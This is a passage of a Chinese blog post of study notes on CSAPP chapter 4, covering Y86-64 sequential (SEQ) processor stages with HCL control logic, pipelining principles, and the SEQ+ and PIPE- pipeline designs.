”程序寄存器“。</p><p>大多时候，寄存器输出会一直保持在当前的寄存器状态上，只有每个时钟到达上升沿时，值才会从寄存器的输入传送到输出。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%AF%84%E5%AD%98%E5%99%A8%E6%96%87%E4%BB%B6.png"></p><p>如上图，每个寄存器文件都有两个读端口和一个写端口。这样的多端口访问机制允许同时进行多个读和写操作。</p><p>同样，因为可以同时进行多个读写操作，就不可避免地发生冲突。这时候我们的随机访问寄存器就派上了用场。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E9%9A%8F%E6%9C%BA%E8%AE%BF%E9%97%AE%E5%AF%84%E5%AD%98%E5%99%A8.png"></p><p>这个内存有一个地址输人，一个写的数据输入，以及一个读的数据输出。</p><p>其中从内存中读的操作类似于组合逻辑，如果我们在输入 address 上提供一个地址, 并将 write 控制信号设置为 0, 那么在经过一些延迟之后，存储在那个地址上的值会出现在输出 data 上，内存将不会响应输入地址上的数据写入请求。如果地址超出了范围，error 信号会设置为 1，否则就设置为 0。</p><p>写内存是由时钟控制的：我们将 address 设置为期望的地址，将 data in 设置为期望的值， write 设置为 1。然后当我们控制时钟时，只要地址是合法的，就会更新内存中指定的位置。</p><p>对于读操作来说，如果地址是不合法的，error 信号会被设置为 1。这个信号是由组合逻辑产生的， 因为所需要的边界检查纯粹就是地址输人的函数，不涉及保存任何状态。</p><h1 id="Y86-64的顺序实现"><a href="#Y86-64的顺序实现" class="headerlink" title="Y86-64的顺序实现"></a>Y86-64的顺序实现</h1><p>首先，我们描述一个称为 SEQ 的处理器。每个时钟周期上，SEQ 执行处理一条完整指令所需的所有步骤。但这需要一个很长的周期，我们需要改进这个缺点，缩短时钟的周期，以实现最终的目的——<strong>实现一个高效、流水线化的处理器</strong>。</p><h3 id="将处理组织成阶段"><a href="#将处理组织成阶段" class="headerlink" title="将处理组织成阶段"></a>将处理组织成阶段</h3><p>处理一条指令包括很多操作，主要有以下几个阶段：</p><ul><li><p>取指 （fetch）</p><p>取指是指从内存中读取指令操作<del>（不是打错字了）</del>，地址为程序计数器的值。从指令中抽取出指令指示符字节的两个四位部分，称为 <em>icode</em>（指令代码）和 <em>ifun</em>（指令功能）。</p><p>它可能取出一个寄存器指示符字节，指明一个或两个寄存器操作数指示符 rA 和 rB 。它还可能取出一个四字节常数字valc。它按顺序方式计算当前指令的下一条指令的地址 <em>valP</em> 。也就是说，valP 等于 PC 的值加上已取出指令的长度。</p></li><li><p>译码（decode）</p><p>译码阶段从寄存器文件中读入最多两个操作数，得到值 <em>valA</em> 和 <em>valB</em>。通常，它读入指令rA和rB字段指明的寄存器，不过有些指令是读寄存器 %rsp 的。</p></li><li><p>执行（execute）</p><p>在执行阶段，算术&#x2F;逻辑单元（ALU）要么执行指令指明的操作（根据ifun的值），计算内存引用的有效地址，要么增加或减少栈指针。得到的值我们称为 <em>valE</em> 。除此之外我们可以设置条件码来限制传送条件。</p></li><li><p>访存（memory）</p><p>访存阶段可以将数据写入内存，或者从内存读出数据。读出的值为 <em>valM</em>。</p></li><li><p>写回（write back）</p><p>写回阶段最多可以写两个结果到寄存器文件。</p></li><li><p>更新PC（PC update）</p><p>将PC设置成下一条指令的地址，更新 %rip 寄存器。</p></li></ul><p>处理器无限循环来执行这些阶段，在我们简化的实现中，任何一个阶段异常处理器都会停止。</p><p>我们采用通用框架来将指令映射到硬件中，例如下表是对 Opq、rrmovq 和 irmovq 类型的指令所需要的处理：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-Y86-64%E6%8C%87%E4%BB%A4%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0.png"></p><p>整数操作都遵循上面的通用模式，在取指阶段我们不需要常数，valP 的值计算为 PC+2 。</p><p>需要注意 push 指令的实现，%rsp 的指针是先减去 8 再写入的，具体流程见下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-pushq%E5%AE%9E%E7%8E%B0.png"></p><h3 id="SEQ硬件结构"><a href="#SEQ硬件结构" class="headerlink" title="SEQ硬件结构"></a>SEQ硬件结构</h3><p>要完成 y86-64 指令的六个基本阶段，需要相应的硬件结构，如下图为硬件结构对应的抽象表示：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-SEQ%E7%A1%AC%E4%BB%B6%E7%BB%93%E6%9E%84.png"></p><p>硬件单元与各个阶段相关联：</p><ul><li>取指：将 PC 作为地址从对应的内存中读取指令，PC 增加器计算指令长度并将新的 PC 暂时放入值 valP 当中</li><li>译码：从寄存器文件中同时读取对应寄存器的值，得到两个操作数</li><li>执行：根据指令类型，将算数&#x2F;逻辑单元用于不同的目的，执行指定运算、改变指针或者计算有效地址等等。这一步可能会更新标志寄存器</li><li>访存：对内存进行访问（读&#x2F;写）</li><li>写回：将新的寄存器值更新到寄存器文件中，这里有两个写端口， E 用于接收 ALU 计算的结果、valM 用于接收读取内存的结果。</li><li>PC 更新：根据预先保存的地址或者是之前计算的指令预计的下一步位置去更新 PC。</li></ul><h3 id="SEQ的时序"><a href="#SEQ的时序" class="headerlink" title="SEQ的时序"></a>SEQ的时序</h3><p>SEQ 的实现包括组合逻辑和两种存储器设备：时钟寄存器（程序计数器和条件码寄存器），随机访问存储器（寄存器文件、指令内存和数据内存）。</p><p>组合逻辑不需要任何时序或控制，只要输人变化了，值就通过逻辑门网络传播。其中读随机访问存储器的操作可以简化地看作是一个立即响应输入地址的组合逻辑操作。</p><p>程序计数器、 条件码寄存器、数据内存和寄存器文件这四个硬件需要有明确的时序控制。这些单元通过一个时钟信号来控制，它触发将新值装载到寄存器，以及将值写到随机访问存储器。由于我们遵循<strong>从不回读</strong>的原则，我们只需要控制内存和寄存器的时钟控制信号。</p><blockquote><p>从不回读：处理器从来不需要为了完成一条指令的执行而去读由该指令更新了的状态。</p></blockquote><h3 id="SEQ阶段的实现"><a href="#SEQ阶段的实现" class="headerlink" title="SEQ阶段的实现"></a>SEQ阶段的实现</h3><p>我们为不同的常数值赋予了不同的意义，包括指示指令代码、功能码、寄存器值和ALU状态等等。具体如下表：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%B8%B8%E6%95%B0%E5%90%AB%E4%B9%89.png"></p><p>其中 nop 指令处了将 pc 加 1 不进行任何操作；halt 指令设置处理器状态，导致程序停止运行。</p><h4 id="取指阶段"><a href="#取指阶段" class="headerlink" title="取指阶段"></a>取指阶段</h4><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%8F%96%E6%8C%87.png"></p><p>取指阶段包括指令内存硬件单元，以 PC 作为第一个字节（字节 0）的地址，这个单元一次从内存读出 10 个字节。</p><p>10字节中的第一个字节被解释成指令字节（Split），分为两个4位的net数。它又被分割得到 icode 和 ifun 。根据 icode 的值，会进一步判断指令是否合法、是否包含寄存器或者常数。</p><p>对应的 Instr valid 、Need_regids、Need_valC 用 HCL 表示如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs HCL">Instr_valid=<br>icode in&#123;<br>0xC,0xD,0xE,0xF    // 检查没有被赋予特殊意义的常数，也就是检查是否合法<br>&#125;；<br><br>Need_regids =<br>icode in &#123; <br>    IRRMOVQ,IOPQ,IPUSHQ,IPOPQ,<br>    IIRMOVQ,IRMMOVQ,IMRMOVQ<br>&#125;;<br><br>Need_valC=<br>icode in&#123;<br>IIRMOVQ,IMRMOVQ,IRMMOVQ,<br>IJXX,ICALL<br>&#125;；<br></code></pre></td></tr></table></figure><h4 id="译码和写回阶段"><a href="#译码和写回阶段" class="headerlink" title="译码和写回阶段"></a>译码和写回阶段</h4><p>这两个阶段都要访问寄存器文件。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E8%AF%91%E7%A0%81%E5%92%8C%E5%86%99%E5%9B%9E.png"></p><p>寄存器文件有四个端口，它支持同时进行两个读和两个写。</p><p>每个端口都有一个地址连接和一个数据连接，地址连接是一个寄存器 ID，而数据连接是一组 64 根线路，既可以作为寄存器文件的输出字（对读端口来说），也可以作为它的输人字（对写端口来说）。 两个读端口的地址输人为 srcA 和 srcB，而两个写端口的地址输人为 dstE 和 dstM。如果某个地址端口上 的值为特殊标识符 OxF(RNONE)，则表明不需要访问 寄存器。</p><p>也就是说， srcA 和 srcB 决定我们从哪个寄存器读数据，对应从 valA 和 valB 中读出。同理 destE 和 destM 决定要去写哪个寄存器，对应数据从 valE 和 valM 中写入。</p><p>四个端口的 HCL 描述如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs hcl">word srcA=[<br>icode in &#123;IRRMOVQ,IRMMOVQ,IOPQ,IPUSHQ&#125;:rA;<br>//只有在 rrmovq，rmmovq，OPq，pushq 指令需要读取操作数所包含的寄存器<br>icode in &#123;IPOPQ, IRET &#125; : RRSP;<br>//在 popq 和 ret 两个指令执行的时候，我们需要额外读取一个 rsp 寄存器<br>    1 : RNONE; <br>];<br><br>word srcB = [<br>    icode in &#123;IRMMOVQ, IMRMOVQ, IOPQ  &#125; : rB;<br>    icode in &#123;IPOPQ, IRET, ICALL, IPUSHQ &#125; : RRSP;<br>    1 : RNONE; # Don&#x27;t need register<br>];<br><br>word dstE = [<br>    icode in &#123; IRRMOVQ &#125; : rB;<br>    icode in &#123; IIRMOVQ, I0PQ&#125; : rB;<br>    icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;<br>    1 : RNONE; # Don&#x27;t write any register<br>];<br><br>word dstM = [<br>icode in &#123;IMRMOVQ,POPQ&#125;:rA;<br>1 : RNONE;<br>];<br></code></pre></td></tr></table></figure><h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><p>执行阶段包括算数&#x2F;逻辑单元（ALU），这个单 元根据 alufun 信号的设置，对输人 aluA 和 aluB 执行 ADD、SUBTRACT、 AND 或 EXCLUSIVEOR 运算。这些数据和控制信号是由三个控制块产生的。ALU 的输出就是 valE 信号。</p><p>如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%89%A7%E8%A1%8C.png"></p><p>执行阶段的第一步就 是每条指令的 ALU 计算。列出的操作数 aluB 在 前面，后面是 aluA，这样是为了保证 subq 指令是 valB 减去 valA 。</p><p>我们用如下的 HCL 表达式来描述 aluA 的行为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs hcl">word aluA=[<br>    icode in &#123; IRRMOVQ,IOPQ&#125;:valA; <br>    icode in &#123; IIRMOVQ,IRMMOVQ,IMRMOVQ&#125;:valC; <br>    icode in &#123; ICALL,IPUSHQ&#125;:-8; <br>    icode in &#123; IRET,IPOPQ&#125;:8;<br>    #Other instructions don&#x27;t need ALU<br>];<br></code></pre></td></tr></table></figure><p>aluA 的计算方式取决于指令的类型，主要涉及了不同指令的源操作数。具体的计算方式如下：</p><ul><li>对于 <code>OPq </code> 指令，<code>aluA</code> 的值等于从寄存器 <code>rA</code> 中读取的 <code>valA </code>。</li><li>对于 <code>rrmovq </code> 指令，<code>aluA </code>的值等于 <code>valA</code>，因为这个指令是简单的数据传送，将 <code>valA </code>赋值给目的寄存器。</li><li>对于 <code>irmovq </code> 指令，<code>aluA </code>的值等于 <code>valC</code>，因为这个指令将立即数（常数）<code>valC </code>赋值给目的寄存器。</li><li>对于 <code>rmmovq  </code> 和 <code>mrmovq</code> 指令，<code>aluA </code>的值等于 <code>valC</code>，因为这些指令需要从指令中提取立即数 <code>valC </code>并与目的寄存器的值相加。</li></ul><p>同理，aluB也是如此，具体的计算方式入下：</p><ul><li>对于 <code>rmmovq</code>、<code>mrmovq</code>、<code>OPq</code>、<code>call</code>、<code>pushq</code>、<code>ret</code> 和 <code>popq</code> 指令，<code>aluB</code> 的值等于从寄存器<code>rB</code>中读取的<code>valB</code>。</li><li>对于 <code>rrmovq</code> 和 <code>irmovq</code> 指令，<code>aluB</code> 的值为0，因为这些指令只是数据传送，所以 <code>aluB</code> 为0。</li></ul><p>观察 ALU 在执行阶段执行的操作，可以看到它通常作为加法器来使用。不过，对于 oPq 指令，我们希望它使用指令 ifun 字段中编码的操作实现其他运算。</p><p>我们有一个信号 ALUfun 来控制 ALU进行什么操作，所以我们这样描述 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs hcl">word alufun = [<br>icode == IOPQ : ifun;<br>//只在执行 OPq 指令的时候根据 func 功能位去选择运算种类<br>1 : ALUADD;<br>]<br></code></pre></td></tr></table></figure><p>当执行 OPq指令时，我们希望设置条件码，对此也有一个信号来控制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hcl">bool set_cc = icode in &#123;IOPQ&#125;;<br></code></pre></td></tr></table></figure><h4 id="访存"><a href="#访存" class="headerlink" title="访存"></a>访存</h4><p>访存阶段的任务就是读或者写程序数据。两个控制块产生内存地址和内存输入数据（为写操作）的值。另外两个块产生表明应该执行读操作还是写操作的控制信号。当执行读操作时， 数据内存产生值 valM。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E8%AE%BF%E5%AD%98.png"></p><h4 id="更新-PC"><a href="#更新-PC" class="headerlink" title="更新 PC"></a>更新 PC</h4><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%9B%B4%E6%96%B0PC.png"></p><p>SEQ的最后阶段会更新程序计数器的值，根据指令类型和是否要选择分支，新的PC可能是 valC、valM 或 calP。</p><h1 id="流水线的通用原理"><a href="#流水线的通用原理" class="headerlink" title="流水线的通用原理"></a>流水线的通用原理</h1><p>SQE 的缺点是要在一个周期内完成所有的操作，必须把时钟周期定的很慢，这样不能充分利用我们的硬件单元。为了解决这个问题，我们引入流水线来或获得更好的性能。</p><p>所谓流水线就是我们所熟知的工厂流水线、自动洗车机这种“流水线化”的系统。在流水线系统中，待执行的任务被划分成了若干个独立的部分，而这些部分是同时进行的。就像汽车加工厂拧螺丝的机器一直在拧螺丝，而不是等一辆车制作完成后再拧下一颗螺丝。</p><h3 id="计算流水线"><a href="#计算流水线" class="headerlink" title="计算流水线"></a>计算流水线</h3><p>下图是一个非流水线化的硬件系统的例子</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E9%9D%9E%E6%B5%81%E6%B0%B4%E7%BA%BF%E7%A1%AC%E4%BB%B6.png"></p><p>由一些执行计算的逻辑以及一个保存结果的寄存器组成，时钟信号会在每个特定的时间间隔去保存寄存器。</p><p>图中的计算块是用组合逻辑来实现的，意味着信号会穿过一系列逻辑门，在一定时间的延迟之后，输出就成为了输入的某个函数。</p><p>下图又是一张流水线化的系统</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E7%A1%AC%E4%BB%B6.png"></p><p>我们将两个系统对比来看，我们假设连个系统运行同一个程序，运算逻辑需要300ps，加载寄存器需要 20ps，那么非流水线化的指令周期就是 320ps。我们将运算分为3个部分，每个阶段需要100ps。然后在各个阶段之间放上流水线寄存器，这样每条指令都会按照这三步经过这个系统，从头到尾完成一次就需要三个完整的时钟周期。</p><blockquote><p>ps（皮秒，10e-12S） 是时间单位</p><p>吞吐量以十亿条指令 &#x2F;S（GIPS）作为单位，在上面的例子中，这个系统的吞吐量就是 1&#x2F;(320×10^12)</p></blockquote><p>这样就可以让三个阶段同时在工作，增加效率，但是执行单条指令所需时间增加。例如同样是这个计算逻辑，我们执行三次，非流水线化的程序需要三个完整的周期 960ps ，而流水线化的程序只需要 600ps （只是用于举例的计算，并不是实际过程中实现需要的时间）</p><h3 id="流水线操作的详细说明"><a href="#流水线操作的详细说明" class="headerlink" title="流水线操作的详细说明"></a>流水线操作的详细说明</h3><p>就像上面的流水线化的程序，把指令分为三个阶段，同一时间可能就会有三条指令经过不同的阶段，比如 240-360。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%8C%BA%E5%88%86.png"></p><p>下面我们跟踪了相应的电路活动</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E6%97%B6%E9%92%9F%E5%91%A8%E6%9C%9F.png"></p><p>在时刻 240（点 1）时钟上升之前，指令 I1 和I2 已经完成了阶段 B 和 A ，阶段A中计算的指令 I2 的值已经到达第一个流水线寄存器的输入，但是该寄存器的状态和输出还保持为指令Il在阶段A中计算的值。在时钟上升后，这些指令开始传送到阶段 C 和 B，而指令 I3 开始经过阶段 A（点 2 和 3）。就像图中点 3 处的曲线化的波阵面（curved wavefront）表明的那样，信号可能以不同的速率通过各个不同的部分。在时刻 360 之前，结果值到达流水线寄存器的输入（点4）。当时刻 360 时钟上升时，各条指令会前进经过一个流水线阶段。</p><p>从这个对流水线操作详细的描述中，我们可以看到减缓时钟不会影响流水线的行为。信号传播到流水线寄存器的输入，但是直到时钟上升时才会改变寄存器的状态。另一方面，如果时钟运行得太快，就会有灾难性的后果。值可能会来不及通过组合逻辑，因此当时钟上升时，寄存器的输人还不是合法的值。</p><h3 id="流水线的局限性"><a href="#流水线的局限性" class="headerlink" title="流水线的局限性"></a>流水线的局限性</h3><p>在我们理想的流水线化系统中，各部分相互独立，每个部分所需的时间都是相同，但实际情况中会有一些因素来降低流水线的效率。</p><h4 id="不一致的划分"><a href="#不一致的划分" class="headerlink" title="不一致的划分"></a>不一致的划分</h4><p>每一阶段的时间不是正好相同，就是降低效率的原因之一。比如下方程序被分为三个不同的阶段，但通过这些阶段的延迟从 50ps 到 150ps 不等。通过所有阶段的延迟和仍然为300ps。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E4%B8%8D%E4%B8%80%E8%87%B4%E7%9A%84%E5%88%92%E5%88%86.png"></p><p>不过，运行时钟的速率是由最慢的阶段的延迟限制的。流水线图表明，每个时钟周期，阶段A都会空闲（用白色方框表示）100ps，而阶段C会空闲 50ps 。只有阶段B会一直处于活动状态。我们必须将时钟周期设为150+20&#x3D;170ps，得到吞吐量为5.88GIPS。另外，由于时钟周期减慢，延迟增加到了 510ps。</p><p>需要注意的是，对硬件设计者来说，将指令过程进行等分是很困难的。通常，处理器中的某些硬件单元，如ALU和内存，是不能被划分成多个延迟较小的单元的。这就使得创建一组平衡的阶段非常困难</p><h4 id="流水线过深，收益反而下降"><a href="#流水线过深，收益反而下降" class="headerlink" title="流水线过深，收益反而下降"></a>流水线过深，收益反而下降</h4><p>我们在这里划分了 50ps 一个阶段，那么我们所需最小时钟周期为 70ps，比起划分为 100ps 一个阶段，性能提高了 120&#x2F;70&#x3D;1.71 倍的效率，虽然我们将划分的<strong>阶段时长减小到了二分之一，但是效率确没有提高 2 倍</strong>，主要是流水线寄存器产生的延迟。如图这种情况，流水线寄存器的延迟占到了 28.6%。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%BB%B6%E8%BF%9F.png"></p><p>许多现代的处理器都采用了很深的流水线（15 或者更多），它们把一条指令的执行分成很多简单的步骤，这样一来，每个阶段的延迟就很小。</p><h3 id="待反馈的流水线系统"><a href="#待反馈的流水线系统" class="headerlink" title="待反馈的流水线系统"></a>待反馈的流水线系统</h3><p>在实际的系统中，我们的每一个指令都不是完全独立的，比如： <code>irmovq $50,%rax; addq %rax,%rbx</code> 这两句代码之间的 rax 就在传递。</p><p>如果只是采用最普通的流水线就会发生异常，在第一条指令的执行阶段，可能第二条指令正在译码，需要去等待第一条指令 %rax 的最终结果，直到第一条指令写回才更新 %rax 寄存器，此时第二条指令已经过了执行阶段了。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E5%B8%A6%E5%8F%8D%E9%A6%88%E7%9A%84%E6%B5%81%E6%B0%B4%E7%BA%BF.png"></p><p>此时我们引入带反馈的流水线，带需要注意，由于流水线改变了系统的行为，我们必须正确处理反馈的影响。</p><p>像上图那样改变系统的行为是不可接受的。我们必须以某种方式来处理指令间的数据和控制相关，以使得到的行为与 ISA 定义的模型相符。</p><h1 id="Y86-64-的流水线实现"><a href="#Y86-64-的流水线实现" class="headerlink" title="Y86-64 的流水线实现"></a>Y86-64 的流水线实现</h1><p>首先，对顺序的SEQ处理器做一点小的改动，将PC的计算挪到取指阶段。然后，在各个阶段之间加上流水线寄存器。在此基础上做一些修改，就能实现我们的目标——一个高效的、流水线化的实现 Y86-64 ISA 的处理器。</p><h3 id="SEQ-：重新安排计算阶段"><a href="#SEQ-：重新安排计算阶段" class="headerlink" title="SEQ+：重新安排计算阶段"></a>SEQ+：重新安排计算阶段</h3><p>我们要调整一下 AEQ 中五个阶段的顺序，使更新 PC 阶段在一个时钟周期开始时进行，从而计算当前指令的 PC 值，而不是结束时执行。 调整后的设计称为 SQE+。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-SEQ+PC.png"></p><p>我们创建<strong>状态寄存器</strong>来保存在一条指令执行过程中计算出来的信号，这种改进称为电路重定时（circuit retiming）。重定时改变了一个系统的状态表示，但是并不改变它的逻辑行为。通常用它来平衡一个流水线系统中各个阶段之间的延迟。</p><blockquote><p>SEQ+不会有硬件寄存器来存放 PC，而是根据前一条指令保存下来的一些状态信息动态地计算 PC</p></blockquote><h3 id="插入流水线寄存器"><a href="#插入流水线寄存器" class="headerlink" title="插入流水线寄存器"></a>插入流水线寄存器</h3><p>如下图为 SEQ+ 的硬件结构，我们要在此基础上插入流水线寄存器：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-SEQ+%E7%A1%AC%E4%BB%B6.png"></p><p>我们插入流水线寄存器后得到 PIPE- 架构，其中灰色底色的框框内就是流水线寄存器：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-SEQ-%E7%A1%AC%E4%BB%B6.png"></p><p>流水线寄存器按如下方式标号：</p><ul><li>F（Fetch Code）保存程序计数器的预测值。</li><li>D（Decode）位于取指和译码阶段之间。它保存关于最新取出的指令的信息，即将由译码阶段进行处理。</li><li>E（Execute）位于译码和执行阶段之间。它保存关于最新译码的指令和从寄存器文件读出的值的信息，即将由执行阶段进行处理。</li><li>M（Memory Access）位于执行和访存阶段之间。它保存最新执行的指令的结果，即将由访存阶段进行处理。它还保存关于用于处理条件转移的分支条件和分支目标的信息。</li><li>W（Write Back）位于访存阶段和反馈路径之间，反馈路径将计算出来的值提供给寄存器文件写，而当完成ret指令时，它还要向PC选择逻辑提供返回地址。</li></ul><p>下面的代码就解释了流水线的步骤。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%A4%84%E7%90%86%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/4-%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%AF%84%E5%AD%98%E5%99%A8%E6%B5%81%E7%A8%8B.png"></p><h3 id="对型号进行重新排列和标号"><a href="#对型号进行重新排列和标号" class="headerlink" title="对型号进行重新排列和标号"></a>对型号进行重新排列和标号</h3><p>顺序实现 SEQ 和 SEQ+ 在一个时刻只处理一条指令，因此诸如 valc、srcA 和 valE 这样的信号值有唯一的值。但在流水线化的设计中，与各个指令相关联的这些值有多个版本，会随着指令一起流过系统。</p><p>例如，在 PIPE- 的详细结构中，有4 个标号为 “Stat” 的白色方框，保存着 4 条不同指令的状态码。我们需要很小心以确保使用的是正确版本的信号。我们采用的命名机制，是<strong>在信号名前面加上大写的流水线寄存名字作为前缀</strong>，存储在流水线寄存器中的信号就可以被唯一地标识。</p><blockquote><p>在命名系统中,</p><p>大写的前缀 “D”、”E”、”M” 和 “W” 指的流水线寄存器，所以 M_stat 指的是流水线寄存器 M的状态码字段。</p><p>小写的前缀” f”、”d”、”e”、”m” 和 “w” 指的是流水线阶段，所以 m_stat 指的是在访存阶段中由控制逻辑块产生出的状态信号。</p></blockquote><p>PIPE- 中有一个块在相同表示形式的 SEQ+ 中是没有的，那就是译码阶段中标号为 <code>SelectA</code> 的块。我们可以看出，这个块会从来自流水线寄存器 D 的 valP 或从寄存器文件 A 端口中读出的值中选择一个，作为流水线寄存器 E的值 valA 。</p><p>这个块是为了减少要携带给流水线寄存器 E 和 M 的状态数量。在所有的指令中，只有 call 在访存阶段需要 valP 的值（压入下一个PC）。只有跳转指令在执行阶段（当不需要进行跳转时）需要 valP 的值。而这些指令又都不需要从寄存器文件中读出的值。</p><p>因此我们合并这两个信号，将它们作为信号 valA 携带穿过流水线，从而可以减少流水线寄存器的状态数量。这样做就消除了 SEQ（图4-23）和SEQ+（图4-40）中标号为 Data 的块，这个块完成的是类似的功能。</p><h3 id="预测下一个PC"><a href="#预测下一个PC" class="headerlink" title="预测下一个PC"></a>预测下一个PC</h3><p>流水线化设计的目的就是每个时钟周期都发射一条新指令，也就是说每个时钟周期都有一条新指令进入执行阶段并最终完成。要达到这个目的吞吐量必须要是是每个时钟周期一条指令。要做到这一点，我们必须在取出当前指令之后，马上确定下一条指令的位置。</p><p>如果取出的指令是条件分支指令，要到指令通过执行阶段之后，我们才能知道是否要选择分支。类似地，如果取出的指令是 ret，要到指令通过访存阶段，才能确定返回地址。</p><p>但是除此之外，我们都能在取指阶段结束后马上知道下一跳指令的地址，<strong>对于无条件跳转来说，下一条指令的地址是指令中的一个常数 valC，对于其他指令来说就是 valP。对于条件跳转指令来说，如果选择了跳转，那么 PC 新的值应当是 valC，如果选择不跳转，那么 PC 新的值应当是 valP。</strong></p><h3 id="流水线冒险"><a href="#流水线冒险" class="headerlink" 